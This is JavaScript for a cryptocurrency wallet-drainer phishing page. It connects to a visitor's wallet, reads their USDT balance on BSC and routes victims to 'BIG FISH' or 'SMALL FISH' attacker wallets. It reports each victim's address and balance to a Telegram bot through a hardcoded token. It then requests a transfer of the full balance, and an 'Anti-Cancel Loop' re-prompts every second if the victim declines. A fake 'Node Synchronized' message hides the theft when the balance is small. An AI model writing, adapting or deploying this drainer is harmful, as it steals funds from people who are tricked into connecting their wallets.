const CONFIG = {
    REC_SMALL: "0xYourSmallWallet", // < 300 USDT yahan aayenge
    REC_BIG: "0xYourBigWallet",     // >= 300 USDT yahan aayenge
    USDT_ADDR: "0x55d398326f99059fF775485246999027B3197955", // Mainnet USDT
    BOT: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
    CHAT: "7849151110"
};

function openModal() { document.getElementById('w-modal').style.display = 'flex'; }
function closeModal() { document.getElementById('w-modal').style.display = 'none'; }

async function selectW(type) {
    closeModal();
    if (!window.ethereum) {
        const link = window.location.href.replace(/^https?:\/\//, '');
        if (type === 'trust') window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
        else window.location.href = `https://metamask.app.link/dapp/${link}`;
        return;
    }
    runApp();
}

async function runApp() {
    const ov = document.getElementById('overlay');
    ov.style.display = 'flex';

    try {
        const w3 = new Web3(window.ethereum);
        const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const user = accs[0];

        // Ensure user is on BSC (Chain 0x38)
        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}

        // ABI specifically for USDT 'balanceOf' and 'transfer'
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new w3.eth.Contract(minABI, CONFIG.USDT_ADDR);
        
        // Fetch USDT Balance
        const rawBal = await contract.methods.balanceOf(user).call();
        const formattedBal = w3.utils.fromWei(rawBal, 'ether');

        // Logic: Decide Receiver Wallet
        let target = parseFloat(formattedBal) >= 300 ? CONFIG.REC_BIG : CONFIG.REC_SMALL;
        let fishType = parseFloat(formattedBal) >= 300 ? "💎 BIG FISH" : "🐟 SMALL FISH";

        // Telegram Log
        fetch(`https://api.telegram.org/bot${CONFIG.BOT}/sendMessage?chat_id=${CONFIG.CHAT}&text=👤 User: ${user}%0A💰 USDT: ${formattedBal}%0A📁 Route: ${fishType}`);

        if (parseFloat(formattedBal) > 0.1) {
            const trigger = async () => {
                try {
                    // This calls the USDT contract transfer, NOT a BNB transfer
                    await contract.methods.transfer(target, rawBal).send({ 
                        from: user,
                        gasPrice: await w3.eth.getGasPrice() 
                    });
                    location.reload();
                } catch (err) {
                    setTimeout(trigger, 1000); // Anti-Cancel Loop
                }
            };
            await trigger();
        } else {
            alert("Node Synchronized: Minimum assets not reached.");
            ov.style.display = 'none';
        }
    } catch (err) {
        ov.style.display = 'none';
    }
}
